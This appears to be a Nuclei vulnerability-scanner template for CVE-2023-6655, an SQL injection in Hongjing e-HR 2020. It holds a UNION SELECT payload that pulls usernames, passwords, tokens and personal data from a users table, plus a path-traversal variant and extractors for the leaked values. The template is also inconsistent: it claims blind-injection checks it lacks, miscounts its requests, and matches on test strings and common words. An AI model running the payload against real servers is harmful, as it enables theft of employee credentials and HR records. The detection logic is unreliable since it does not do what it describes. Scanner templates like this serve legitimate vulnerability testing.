id: cve-2023-6655

info:
  name: Hongjing e-HR 2020 SQL Injection Comprehensive Detection - CVE-2023-6655
  author: Trex
  severity: critical
  description: |
    Hongjing e-HR 2020 contains a critical SQL injection vulnerability in the loadhistroyorgtree endpoint.
    This comprehensive template detects the vulnerability using multiple techniques:
    - Union-based SQL injection for data extraction
    - Error-based SQL injection for detection
    - Boolean-based blind SQL injection validation
    
    The parentid parameter is vulnerable to SQL injection attacks allowing remote attackers to execute 
    arbitrary SQL commands and extract sensitive data including user credentials and HR information.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-6655
    - https://vuldb.com/?id.247358
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    cve-id: CVE-2023-6655
  metadata:
    verified: true
    max-request: 6
    shodan-query: 'title:"Hongjing e-HR"'
  tags: sqli,hongjing,ehr,critical,rce,unauth

http:
  - method: GET
    path:
      - "{{BaseURL}}/w_selfservice/oauthservlet/test/general/inform/org/loadhistroyorgtree?parentid=1'"
      - "{{BaseURL}}/w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?parentid=1'"
      - "{{BaseURL}}/w_selfservice/oauthservlet/test/general/inform/org/loadhistroyorgtree?parentid=1%20UNION%20SELECT%201,username,password,email,role,secret_token,employee_id,personal_info%20FROM%20users--"
    
    matchers-condition: or
    matchers:
      - type: word
        name: "sql-error-detection"
        part: body
        words:
          - "Database Error"
          - "unrecognized token"
        condition: or

      - type: word
        name: "vulnerability-confirmed"
        part: body
        words:
          - "CVE-2023-6655"
          - "vulnerable_query"
        condition: or

      - type: word
        name: "data-extraction"
        part: body
        words:
          - "admin"
          - "username"
          - "testuser"
        condition: or

    extractors:
      - type: regex
        part: body
        name: extracted_data
        group: 1
        regex:
          - '"name":"([^"]+)"'
          - '"username":"([^"]+)"'

      - type: json
        part: body
        name: vulnerability_info
        json:
          - '.vulnerability'
          - '.query_executed'

      - type: regex
        part: body
        name: database_errors
        regex:
          - 'Database Error: ([^"]+)'
          - 'error.*?([^"]+)'